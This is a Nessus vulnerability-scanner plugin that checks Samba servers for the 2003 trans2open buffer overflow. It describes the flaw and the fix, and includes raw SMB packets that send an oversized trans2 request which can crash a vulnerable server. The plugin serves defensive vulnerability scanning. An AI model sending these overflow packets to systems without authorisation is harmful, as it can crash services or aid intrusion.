#
# (C) Tenable Network Security, Inc.
#

# Ref:
#  Date: Mon, 7 Apr 2003 07:44:58 +0000 (UTC)
#  From: Erik Parker <erik.parker@digitaldefense.net>
#  To: vulnwatch@vulnwatch.org
#  Subject: [VulnWatch] [DDI-1013] Buffer Overflow in Samba allows remote root compromise
#

include("compat.inc");

if (description)
{
 script_id(11523);
 script_version("$Revision: 1.30 $");
 script_cvs_date("$Date: 2016/04/13 15:25:33 $");

 script_cve_id("CVE-2003-0196", "CVE-2003-0201");
 script_bugtraq_id(7294, 7295);
 script_osvdb_id(4469, 13397);
 script_xref(name:"RHSA", value:"2003:137-02");
 script_xref(name:"SuSE", value:"SUSE-SA:2003:025");

 script_name(english:"Samba < 2.2.8a / 3.0.0 Multiple Remote Overflows");
 script_summary(english:"overflows the remote samba server");

 script_set_attribute(attribute:"synopsis", value:"Arbitrary code may be run on the remote server.");
 script_set_attribute(attribute:"description", value:
"The remote Samba server is vulnerable to a buffer overflow when it
calls the function trans2open(). An attacker may exploit this flaw to
gain a root shell on this host.

In addition, it is reported that this version of Samba is vulnerable
to additional overflows, although Nessus has not checked for them.");
 script_set_attribute(attribute:"solution", value:"Upgrade to Samba 2.2.8a or 3.0.0.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_malware", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Samba trans2open Overflow (Solaris SPARC)');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
 script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
 script_set_attribute(attribute:"canvas_package", value:'CANVAS');

 script_set_attribute(attribute:"vuln_publication_date", value:"2003/04/07");
 script_set_attribute(attribute:"plugin_publication_date", value:"2003/04/07");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:samba:samba");
 script_end_attributes();

 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2003-2016 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely");

 script_dependencie("smb_nativelanman.nasl");
 script_require_keys("SMB/samba", "Settings/ParanoidReport");
 script_require_ports(139,445);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("smb_func.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

#
# The script code starts here
#

function old_smb_recv(socket, length)
{
   local_var header, len, trailer;

   header = recv(socket:socket, length:4, min:4);
   if (strlen(header) < 4)return(NULL);
   len = 256 * ord(header[2]);
   len += ord(header[3]);
   if (len == 0)return(header);
   trailer = recv(socket:socket, length:len, min:len);
   if(strlen(trailer) < len )return(NULL);
   return strcat(header, trailer);
}

port = kb_smb_transport();
if(!get_port_state(port))exit(1);


ssetup = raw_string(0x00, 0x00, 0x00, 0x2e, 0xff, 0x53, 0x4d, 0x42, 0x73, 0x00, 0x00, 0x00, 0x00, 0x08,
                   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0x00, 0x00, 0x00, 0x00, 0x20, 0x02, 0x00, 0x01,
                   0x00, 0x00, 0x00, 0x00);


treeconnect = raw_string(0x00, 0x00, 0x00, 0x3c, 0xff, 0x53, 0x4d, 0x42, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00,
           0x00, 0x00, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5c, 0x5c, 0x69, 0x70, 0x63, 0x24,
           0x25, 0x6e, 0x6f, 0x62, 0x6f, 0x64, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x49, 0x50,
           0x43, 0x24);

trans2 = raw_string(
            0x00, 0x00, 0xA, 0x00, 0xff, 0x53, 0x4d, 0x42, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x64, 0x00, 0x00, 0x00, 0x00, 0xd0, 0x07, 0x0c, 0x00, 0xd0, 0x07, 0x0c, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd0, 0x07, 0x43, 0x00, 0x0c, 0x00, 0x14, 0x08, 0x01,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90);
trans2 +=  crap(4096 - strlen(trans2));


soc = open_sock_tcp(port);
if(!soc)exit(1);


send(socket:soc, data:ssetup);
r = old_smb_recv(socket:soc);
if(strlen(r) < 33)exit(0);

send(socket:soc, data:treeconnect);
r = old_smb_recv(socket:soc);
if(!r)exit(0);

send(socket:soc, data:trans2);
r = old_smb_recv(socket:soc);
if(!r)security_hole(port);
close(soc);
